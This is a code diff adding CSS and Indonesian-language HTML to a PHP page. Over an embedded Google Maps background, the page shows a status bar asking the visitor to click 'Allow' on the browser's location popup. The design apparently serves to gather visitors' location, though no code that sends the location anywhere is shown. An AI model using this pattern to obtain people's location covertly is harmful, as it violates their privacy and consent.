@@ -384,11 +384,112 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     bottom: 120px;
                 }
             }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.0);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            pointer-events: none;
+        }
+        
+        /* Status Bar - Menampilkan status permintaan lokasi */
+        .location-status-bar {
+            position: absolute;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 12px 20px;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            max-width: 320px;
+            pointer-events: none;
+        }
+        
+        .location-status-bar.hidden {
+            opacity: 0;
+            transform: translateY(20px);
+            pointer-events: none;
+        }
+        
+        .status-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+        
+        .status-icon.waiting {
+            background: #fbbc04;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .status-icon.success {
+            background: #34a853;
+        }
+        
+        .status-icon.error {
+            background: #ea4335;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.5; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1.1); }
+        }
+        
+        .status-text {
+            flex: 1;
+            font-size: 13px;
+            color: white;
+            font-weight: 500;
+        }
+        
+        .status-sub {
+            font-size: 11px;
+            color: rgba(255,255,255,0.6);
+            margin-top: 2px;
+        }
+        
+        @media (max-width: 768px) {
+            .location-status-bar {
+                bottom: 120px;
+                left: 12px;
+                right: 12px;
+                max-width: none;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="map-background">
         <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15843.34861652759!2d106.82271665!3d-6.1753924!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sid!4v1710925200000!5m2!1sen!2sid" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay"></div>
+    
+    <!-- Status Bar untuk menunggu izin lokasi -->
+    <div class="location-status-bar" id="locationStatusBar">
+        <div class="status-icon waiting" id="statusIcon">
+            <i class="fas fa-location-arrow" style="font-size: 12px;"></i>
+        </div>
+        <div>
+            <div class="status-text" id="statusText">Menunggu izin lokasi...</div>
+            <div class="status-sub" id="statusSub">Klik "Izinkan" pada popup browser</div>
+        </div>
     </div>
 
     <!-- Search box dan controls lainnya ... -->
